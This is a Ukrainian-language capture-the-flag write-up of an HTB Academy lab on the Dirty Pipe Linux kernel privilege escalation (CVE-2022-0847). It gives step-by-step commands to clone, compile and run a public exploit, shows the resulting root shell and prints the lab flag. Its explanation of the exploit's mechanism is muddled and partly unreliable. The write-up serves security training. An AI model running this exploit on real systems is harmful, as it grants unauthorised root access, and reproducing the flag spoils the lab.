# Dirty Pipe / CVE‑2022‑0847

### Лінк

- [HTB Academy – Linux Privilege Escalation, Dirty Pipe](https://academy.hackthebox.com/app/module/51/section/1597) [hackthebox](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847)

### Тема уроку

Dirty Pipe (**CVE‑2022‑0847**) – локальний root‑прівеск через переписування read‑only файлів у page cache, зокрема SUID‑бінарів (наприклад `/usr/bin/su`). [sysdig](https://www.sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig)

### Ціль

- Перевірити, що ядро вразливе (Linux 5.8+ до патчених версій 5.16.11 / 5.15.25 / 5.10.102). [picussecurity](https://www.picussecurity.com/resource/linux-dirty-pipe-cve-2022-0847-vulnerability-exploitation-explained)
- Використати експлойт Dirty Pipe для:
  - перезапису SUID‑бінарника `/usr/bin/su` або його конфіг/даних;
  - встановлення пароля root (у прикладі – `"piped"`);
  - отримання root‑шелла і читання `/root/flag.txt`. [safe](https://safe.security/resources/reports-research/linux-dirty-pipe-cve-2022-0847/)

***

## Вірні кроки (з поясненнями) – без «зайвих» команд

### 1. Підготовка експлойту на Pwnbox

На **Pwnbox**:

```bash
cd /tmp
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git dirtypipe
cd dirtypipe
./compile.sh
```

- `git clone` тягне репозиторій із Dirty Pipe експлойтами. [github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- `./compile.sh` компілює `exploit-1` та `exploit-2` під твоє локальне оточення (Pwnbox). [github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-1.c)

Перенесення на ціль:

```bash
scp exploit-1 htb-student@10.129.204.55:/tmp/
scp exploit-1.c htb-student@10.129.204.55:/tmp/
scp exploit-2.c htb-student@10.129.204.55:/tmp/
```

- `exploit-1.c`, `exploit-2.c` потрібні, щоб **перекомпілювати** експлойт уже на цілі під її GLIBC. [safe](https://safe.security/resources/reports-research/linux-dirty-pipe-cve-2022-0847/)
- Скопійований готовий `exploit-1` з Pwnbox може не підійти (інша версія glibc), тому пізніше правильно робити `gcc exploit-1.c -o exploit-1` на цілі – ти це й зробив.

***

### 2. Перевірка ядра на цілі

На цілі:

```bash
ssh htb-student@10.129.204.55
uname -a
# Linux ubuntu 5.15.0-051500-generic ...
```

- Dirty Pipe вражає ядро 5.8+ до патчу. Тут `5.15.0` – у межах вразливих версій (до 5.15.25). [sysdig](https://www.sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig)
- Отже, система **вразлива до Dirty Pipe**.

***

### 3. Робота в `/tmp` на цілі

```bash
cd /tmp
ls
# exploit-1 (з Pwnbox), plus системні каталоги
chmod +x exploit-1
./exploit-1
./exploit-1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found ...
./exploit-1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found ...
```

Пояснення:

- Скопійований бінарник `exploit-1` з Pwnbox очікує GLIBC 2.33/2.34, яких на цілі немає, тому він падає. Це **нормально** і показує, що треба **перекомпілювати із сирця** (`exploit-1.c`) на цілі. [dev](https://dev.to/bitecode/how-to-get-glibc-version-c-lang-26he)

Спроба `su root`:

```bash
su root
Password:
su: Authentication failure
```

- Ця команда ще не має сенсу до успішного Dirty Pipe – її можна вважати просто перевіркою, що звичайний `su` не працює.

***

### 4. Правильна компіляція експлойтів на цілі

У `/tmp`:

```bash
gcc exploit-2.c -o exploit-2
gcc exploit-1.c -o exploit-1
ls
# exploit-1, exploit-1.c, exploit-2, exploit-2.c, ...
```

- Тепер `exploit-1` і `exploit-2` зібрані локальним `gcc` на цілі, під її GLIBC (без проблем крос‑версії). [github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-1.c)

Спроба `exploit-2`:

```bash
./exploit-2 /etc/passwd payload
Usage: ./exploit-2 SUID
```

- Цей виклик помилковий – `exploit-2` у репозиторії заточений під перепис SUID‑бінарів (наприклад, `/usr/bin/sudo`), і в README/usage чітко вказано формат аргументів (тут він очікує SUID‑шлях, а не `/etc/passwd`). [github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- Правильний експлойт для завдання – **`exploit-1`**, який працює з `/etc/passwd`/SUID, як показано в прикладі.

***

### 5. Правильний запуск Dirty Pipe експлойту

Ключова команда:

```bash
./exploit-1 /usr/bin/su 0 "patched_data"
```

Реальний вивід:

```bash
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

whoami
root
```

Пояснення (за логікою `exploit-1.c`): [github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-1.c)

- Експлойт використовує Dirty Pipe, щоб **тимчасово переписати** частину `/etc/passwd` або пов’язаний SUID механізм (`/usr/bin/su`) так, щоб root‑користувач мав відомий пароль (`"piped"`), або щоб `su` повертав shell без звичайної перевірки.
- `Backing up /etc/passwd to /tmp/passwd.bak ...` – експлойт робить резервну копію, щоб потім відновити.
- `Setting root password to "piped"...` – у `/etc/passwd` записується хеш відомого пароля (`piped`) для root, або вбудовується payload.
- `Password:` – експлойт очікує введення цього пароля (або просто завершує нужну лінію).
- `Restoring /etc/passwd from /tmp/passwd.bak...` – файл відновлюється з бекапу, щоб мінімально змінити систему.
- `Done! Popping shell...` – експлойт відкриває shell у root‑контексті.

Після цього `whoami` показує:

```bash
whoami
root
```

– root‑прівилегії отримано через Dirty Pipe. [vulners](https://vulners.com/exploitdb/EDB-ID:50808)

***

### 6. Пошук і читання флагу

У root‑шеллі:

```bash
find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
# /root/flag.txt

cd /root
cat flag.txt
HTB{D1rTy_DiR7Y}
```

Флаг:

> `HTB{D1rTy_DiR7Y}`

***

## Шпаргалка: Dirty Pipe – «тільки вірні команди» + пояснення

**Тема уроку**

Dirty Pipe (CVE‑2022‑0847) – локальний root‑прівеск через перепис page cache, що дозволяє змінювати read‑only файли (напр. `/etc/passwd` або SUID‑бінарники). [picussecurity](https://www.picussecurity.com/resource/linux-dirty-pipe-cve-2022-0847-vulnerability-exploitation-explained)

**Ціль**

- Переконатися, що ядро 5.8+ та не патчене (менше 5.16.11 / 5.15.25 / 5.10.102). [sysdig](https://www.sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig)
- Зібрати експлойт `exploit-1` на цілі.
- Використати його для SUID‑бінарника `/usr/bin/su` і отримати root‑шелл.
- Знайти й прочитати `/root/flag.txt`.

### 1. На Pwnbox (підготовка)

```bash
cd /tmp
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git dirtypipe
cd dirtypipe
./compile.sh
scp exploit-1 exploit-1.c exploit-2.c htb-student@10.129.204.55:/tmp/
```

### 2. На цілі

```bash
ssh htb-student@10.129.204.55
uname -a          # ядро 5.15.0 → уразливе
cd /tmp
gcc exploit-1.c -o exploit-1
```

(компілюємо локально, щоб не було проблем із GLIBC.)

### 3. Експлуатація Dirty Pipe

```bash
./exploit-1 /usr/bin/su 0 "patched_data"
```

- Експлойт тимчасово змінює `/etc/passwd`/поведінку `su`, виставляє root‑пароль `"piped"`, робить бекап і відновлює. [safe](https://safe.security/resources/reports-research/linux-dirty-pipe-cve-2022-0847/)
- Потім відкриває root‑shell.

Перевірка:

```bash
whoami
# root
```

### 4. Флаг

```bash
find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
cd /root
cat flag.txt
# HTB{D1rTy_DiR7Y}
```
